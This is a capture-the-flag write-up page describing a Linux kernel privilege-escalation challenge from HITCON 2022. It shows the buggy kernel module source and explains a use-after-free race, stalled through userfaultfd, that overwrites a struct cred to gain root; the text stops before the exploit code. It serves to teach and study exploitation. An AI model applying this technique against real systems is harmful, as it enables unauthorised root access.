<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Fourchain - Kernel | Organisers</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Fourchain - Kernel" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="CTF Team" />
<meta property="og:description" content="CTF Team" />
<link rel="canonical" href="https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel.html" />
<meta property="og:url" content="https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel.html" />
<meta property="og:site_name" content="Organisers" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Fourchain - Kernel" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Fourchain - Kernel","url":"https://org.anize.rs/HITCON-2022/pwn/fourchain-kernel.html"}</script>
<!-- End Jekyll SEO tag -->


    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
    <meta name="twitter:card" content="summary" />
    <!-- TODO <meta name="twitter:description" content="" /> -->
    <meta name="twitter:title" content="Organisers" />
    <meta name="twitter:site" content="@0rganizers" />
    <!-- TODO <meta name="twitter:image" content="" /> -->

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#040d21">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Hack monospace font -->
    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">

    <!-- legitimize current Mastodon profile via link verification -->
    <link rel="me" href="https://infosec.exchange/@organizers" />


    <script type="text/javascript">
        function isLightThemeSelected() {
          return document.cookie.match(/theme=light/i) != null
        }

        function setThemeFromCookie() {
            var html = document.getElementsByTagName('html')[0]
            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
            console.log('Loaded cookie: ' + document.cookie)
        }

        (function() {
          setThemeFromCookie()
        })();
    </script>

    <script type="text/javascript">
        function getFootnoteContent(linkId) {
            const fnId = linkId.replace(/^fnref/, 'fn');
            return document.getElementById(fnId).querySelector("p").innerHTML;
        }

        function addFootnote(element, content) {
            const footnote = document.createElement('div');
            footnote.classList.add('footnote-box');
            // Also add the footnote number
            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
                footnote.removeChild(backlink);
            });
            element.insertAdjacentElement('afterend', footnote);
            element.dataset.toggled = '1';
        }

        function removeFootnote(element) {
            element.parentElement.removeChild(element.nextSibling);
            element.dataset.toggled = '0';
        }


        window.addEventListener("load", function() {
            document.querySelectorAll("a.footnote").forEach((el) => {
                const sup = el.parentElement;
                el.addEventListener("click", (event) => {
                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
                    if (!isOpen) {
                        addFootnote(sup, getFootnoteContent(sup.id));
                    } else {
                        removeFootnote(sup);
                    }
                    event.preventDefault();
                });
            });
        });
    </script>

    <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      "HTML-CSS": {
        fonts: ["Gyre-Pagella"],
        imageFont: null,
        undefinedFamily: "'Arial Unicode MS', cmbright"
      },
      tex2jax: {
        inlineMath: [['$', '$'], ['\\(', '\\)']],
        processEscapes: true
      }
    });
  </script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
  </head>
  
  <body> 
    <header class="page-header-simple" role="banner">
      
      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
      <div class="right-links">
        <a href="/writeups">Writeups</a>
        <a href="/achievements">Achievements</a>
      </div>
    </header>

    <main id="content" class="main-content" role="main">
      <h2 id="fourchain---kernel">Fourchain - Kernel</h2>

<p><strong>Authors</strong>: <a href="https://twitter.com/pqlqpql">pql</a></p>

<p><strong>Tags</strong>: pwn, kernel</p>

<p><strong>Points</strong>: 321</p>

<blockquote>
  <p>It’s more krazy in the kernel…</p>

  <p>ssh -p 54321 knote@35.238.182.189
password: knote</p>

  <p>Resources are limited, please work on local first.</p>

  <p>kernel-39fb8300c4181886fecd27bf4333b58348faf279.zip</p>

  <p>Author: Billy</p>
</blockquote>

<p>This year’s HITCON CTF was a lot of fun! Sadly, I could only play during the second half, but I managed to solve a few challenges, including <code class="language-plaintext highlighter-rouge">fourchain-kernel</code>.</p>

<p>This challenge was the third part in the chain: after pwning the renderer process and breaking out of the chromium sandbox, we’re now tasked with getting kernel privileges.</p>

<p>Like all parts of the fullchain, this was a separate challenge on which you could earn points without completing any other part of the chain.</p>

<hr />

<p>The challenge follows a pretty standard Linux kernel CTF setup: we’re provided a <code class="language-plaintext highlighter-rouge">bzImage</code> and the source code of a module that registers a character device, presumably with some vulnerability we have to exploit. Generally, these types of challenges are more about the exploitation than about the vulnerability research, so let’s see what stands out:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/kernel.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/slab.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/uaccess.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/miscdevice.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/ioctl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;linux/random.h&gt;</span><span class="cp">
</span>
<span class="cp">#define IOC_MAGIC '\xFF'
</span>
<span class="cp">#define IO_ADD     _IOWR(IOC_MAGIC, 0, struct ioctl_arg)
#define IO_EDIT    _IOWR(IOC_MAGIC, 1, struct ioctl_arg)
#define IO_SHOW    _IOWR(IOC_MAGIC, 2, struct ioctl_arg)
#define IO_DEL	   _IOWR(IOC_MAGIC, 3, struct ioctl_arg)
</span>
<span class="k">struct</span> <span class="n">ioctl_arg</span>
<span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">node</span>
<span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">key</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">static</span> <span class="k">struct</span> <span class="n">node</span> <span class="o">*</span><span class="n">table</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">drv_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">long</span> <span class="nf">drv_unlocked_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">);</span>


<span class="k">static</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">drv_fops</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">open</span> <span class="o">:</span> <span class="n">drv_open</span><span class="p">,</span>
    <span class="n">unlocked_ioctl</span> <span class="o">:</span> <span class="n">drv_unlocked_ioctl</span>
<span class="p">};</span>


<span class="k">static</span> <span class="k">struct</span> <span class="n">miscdevice</span> <span class="n">note_miscdev</span> <span class="o">=</span> <span class="p">{</span>
    <span class="p">.</span><span class="n">minor</span>      <span class="o">=</span> <span class="mi">11</span><span class="p">,</span>
    <span class="p">.</span><span class="n">name</span>       <span class="o">=</span> <span class="s">"note2"</span><span class="p">,</span>
    <span class="p">.</span><span class="n">fops</span>       <span class="o">=</span> <span class="o">&amp;</span><span class="n">drv_fops</span><span class="p">,</span>
    <span class="p">.</span><span class="n">mode</span>	<span class="o">=</span> <span class="mo">0666</span><span class="p">,</span>
<span class="p">};</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">drv_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">){</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">static</span> <span class="kt">long</span> <span class="nf">drv_unlocked_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x200</span> <span class="o">/</span> <span class="mi">8</span><span class="p">];</span>
    <span class="kt">uint64_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">ioctl_arg</span> <span class="n">data</span><span class="p">;</span>

    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ioctl_arg</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">data</span><span class="p">))){</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
        <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">data</span><span class="p">.</span><span class="n">idx</span> <span class="o">&amp;=</span> <span class="mh">0xf</span><span class="p">;</span>
    <span class="n">data</span><span class="p">.</span><span class="n">size</span> <span class="o">&amp;=</span> <span class="mh">0x1ff</span><span class="p">;</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">IO_ADD</span><span class="p">:</span> <span class="p">{</span>
        <span class="n">data</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">table</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
                <span class="n">data</span><span class="p">.</span><span class="n">idx</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
            <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">node</span><span class="o">*</span><span class="p">)</span><span class="n">kzalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">node</span><span class="p">),</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
        <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>
        <span class="n">get_random_bytes</span><span class="p">(</span><span class="o">&amp;</span><span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">));</span>

        <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">kzalloc</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">size</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>

        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">&lt;</span> <span class="n">data</span><span class="p">.</span><span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
            <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">;</span>
        <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">,(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span><span class="n">data</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
        <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">=</span>  <span class="n">addr</span> <span class="o">^</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">break</span><span class="p">;</span>         
    <span class="k">case</span> <span class="n">IO_EDIT</span><span class="p">:</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">])</span> <span class="p">{</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">^</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">;</span>
            <span class="n">size</span> <span class="o">=</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;</span> <span class="mh">0x1ff</span><span class="p">;</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>

            <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">;</span>
            <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">IO_SHOW</span><span class="p">:</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">])</span> <span class="p">{</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">^</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">;</span>
            <span class="n">size</span> <span class="o">=</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;</span> <span class="mh">0x1ff</span><span class="p">;</span>
            <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
            
            <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">;</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">((</span><span class="kt">void</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">.</span><span class="n">addr</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">IO_DEL</span><span class="p">:</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">])</span> <span class="p">{</span>
            <span class="n">addr</span> <span class="o">=</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">addr</span> <span class="o">^</span> <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">key</span><span class="p">;</span>
            <span class="n">kfree</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">);</span>
            <span class="n">kfree</span><span class="p">(</span><span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]);</span>
            <span class="n">table</span><span class="p">[</span><span class="n">data</span><span class="p">.</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">break</span><span class="p">;</span>
    <span class="nl">default:</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">ENOTTY</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nl">done:</span>
        <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">static</span> <span class="kt">int</span> <span class="nf">note_init</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="k">return</span> <span class="n">misc_register</span><span class="p">(</span><span class="o">&amp;</span><span class="n">note_miscdev</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">note_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="n">misc_deregister</span><span class="p">(</span><span class="o">&amp;</span><span class="n">note_miscdev</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">module_init</span><span class="p">(</span><span class="n">note_init</span><span class="p">);</span>
<span class="n">module_exit</span><span class="p">(</span><span class="n">note_exit</span><span class="p">);</span>

<span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">"Secret Note v2"</span><span class="p">);</span>
</code></pre></div></div>

<p>The character device can store up to sixteen (global) “secret notes” that are “encrypted”, each with their own xor key that is generated upon creation. The notes are stored in the global <code class="language-plaintext highlighter-rouge">table</code> array, which consists of <code class="language-plaintext highlighter-rouge">struct node</code> pointers - each containing a random <code class="language-plaintext highlighter-rouge">key</code>, the <code class="language-plaintext highlighter-rouge">size</code> of the contents, and an <code class="language-plaintext highlighter-rouge">addr</code> that once XORed with <code class="language-plaintext highlighter-rouge">key</code> points to the contents (a buffer that was dynamically allocated with <code class="language-plaintext highlighter-rouge">kzalloc</code>.) Note that the contents themselves are XORed with <code class="language-plaintext highlighter-rouge">key</code> as well, and that <code class="language-plaintext highlighter-rouge">size</code> is limited of 0x1ff.</p>

<p>The following ioctls are available:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">IO_ADD</code> - Create a new note, with contents of a certain size. Returns us the index of the note.</li>
  <li><code class="language-plaintext highlighter-rouge">IO_EDIT</code> - Given such an index, replaces the contents of the corresponding note.</li>
  <li><code class="language-plaintext highlighter-rouge">IO_SHOW</code> - Given such an index, copies the contents to a buffer in user memory.</li>
  <li><code class="language-plaintext highlighter-rouge">IO_DEL</code> - Given such an index, destroys and removes the note and frees up the index for future use.</li>
</ul>

<p>The vulnerability is pretty clear: there is no attempt at all to serialize the state transitions with e.g. a lock. For example, if an <code class="language-plaintext highlighter-rouge">IO_DEL</code> request is issued in parallel with an <code class="language-plaintext highlighter-rouge">IO_EDIT</code> request - the latter might end up writing to a buffer that was already <code class="language-plaintext highlighter-rouge">kfree()</code>-d.</p>

<p>On first sight, it might look like the race window is very small, but the <code class="language-plaintext highlighter-rouge">copy_from_user()</code> call in the <code class="language-plaintext highlighter-rouge">IO_EDIT</code> path gives us an easy way out: this call will block if it triggers a page fault whilst trying to read user memory. This extends the race window, so we have a chance to reallocate the buffer we freed with <code class="language-plaintext highlighter-rouge">IO_DEL</code></p>

<p>The provided kernel also gives unprivileged users access to <code class="language-plaintext highlighter-rouge">userfaultfd</code>, so we can handle page faults in usermode and make them block indefinitely. This is very nice, because now we don’t even have to hit a race window anymore - the serialization of the operations is totally up to us.</p>

<p>As a sidenote, generally userfaultfd is not enabled in the “real world”. On systems without userfaultfd, it’s sometimes possible to get an equivalent primitive using a FUSE handler and <code class="language-plaintext highlighter-rouge">mmap()</code>. If that’s also not a possibility, massaging the surrounding state of an existing regular page fault handler to make it take as long as possible is your best bet.</p>

<hr />

<p>We want to get more or less the following sequence:</p>

<ol>
  <li>Allocate a note with idx <code class="language-plaintext highlighter-rouge">i</code>.</li>
  <li>Issue an <code class="language-plaintext highlighter-rouge">IO_EDIT</code> request for <code class="language-plaintext highlighter-rouge">i</code>, with an address pointing to a page we registered with userfaultfd.
    <ul>
      <li>We’ll receive a notification through the userfaultfd and can stall the page fault as long as we want.</li>
    </ul>
  </li>
  <li>Issue an <code class="language-plaintext highlighter-rouge">IO_DEL</code> request for <code class="language-plaintext highlighter-rouge">i</code> to free its <code class="language-plaintext highlighter-rouge">struct node</code> and backing buffer.</li>
  <li>Reallocate the backing buffer to something juicy.</li>
  <li>Unblock the pending page fault through userfaultfd, by faulting in a page with our desired payload.
    <ul>
      <li>The <code class="language-plaintext highlighter-rouge">IO_EDIT</code> request will resume and copy our payload to said juicy something.</li>
    </ul>
  </li>
</ol>

<p>An obvious contender for the juicy object competition is <code class="language-plaintext highlighter-rouge">struct cred</code> - if the cred is already relative to the root user namespace (<code class="language-plaintext highlighter-rouge">&amp;init_user_ns</code>), we can just overwrite all the -id fields to <code class="language-plaintext highlighter-rouge">0</code> and the cap- fields to <code class="language-plaintext highlighter-rouge">0x1ffffffff</code> (full capabilities) to gain root privileges.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
	<span class="n">atomic_t</span>	<span class="n">usage</span><span class="p">;</span>
	<span class="n">kuid_t</span>		<span class="n">uid</span><span class="p">;</span>		<span class="cm">/* real UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">gid</span><span class="p">;</span>		<span class="cm">/* real GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">suid</span><span class="p">;</span>		<span class="cm">/* saved UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">sgid</span><span class="p">;</span>		<span class="cm">/* saved GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">euid</span><span class="p">;</span>		<span class="cm">/* effective UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">egid</span><span class="p">;</span>		<span class="cm">/* effective GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">fsuid</span><span class="p">;</span>		<span class="cm">/* UID for VFS ops */</span>
	<span class="n">kgid_t</span>		<span class="n">fsgid</span><span class="p">;</span>		<span class="cm">/* GID for VFS ops */</span>
	<span class="kt">unsigned</span>	<span class="n">securebits</span><span class="p">;</span>	<span class="cm">/* SUID-less security management */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_inheritable</span><span class="p">;</span> <span class="cm">/* caps our children can inherit */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_permitted</span><span class="p">;</span>	<span class="cm">/* caps we're permitted */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_effective</span><span class="p">;</span>	<span class="cm">/* caps we can actually use */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_bset</span><span class="p">;</span>	<span class="cm">/* capability bounding set */</span>
	<span class="n">kernel_cap_t</span>	<span class="n">cap_ambient</span><span class="p">;</span>	<span class="cm">/* Ambient capability set */</span>
    <span class="c1">//[...]</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The standalone challenge only requires us to read/write the flag file in <code class="language-plaintext highlighter-rouge">/root</code>, so only overwriting <code class="language-plaintext highlighter-rouge">uid</code> or <code class="language-plaintext highlighter-rouge">fsid</code> would be enough already. However, for the full chain we want to be able to load a kernel module to pwn the hypervisor, and we’ll need the <code class="language-plaintext highlighter-rouge">CAP_SYS_MODULE</code> capability for that.</p>

<p>Apart from being a nice excercise, making the exploit reliable is also a priority here. Every failed full chain attempt on the remote would set us back about 10 minutes due to reboot times and such.</p>

<p>I deliberately did not attempt to get instruction pointer control at any point here. It’s often a very unelegant solution - getting the kernel thread to return from the syscall gracefully is a pain, you need a leak, it creates a dependency on the offsets of the target kernel and in real world scenarios you also break a lot of state (deadlocks, etc.). Some creative spraying and targeting the right allocations goes a long way.</p>

<p>I ended up going with a “two-stage” approach, with two <code class="language-plaintext highlighter-rouge">IO_EDIT</code> requests (E1, E2) for the same note blocking with userfaultfd.</p>

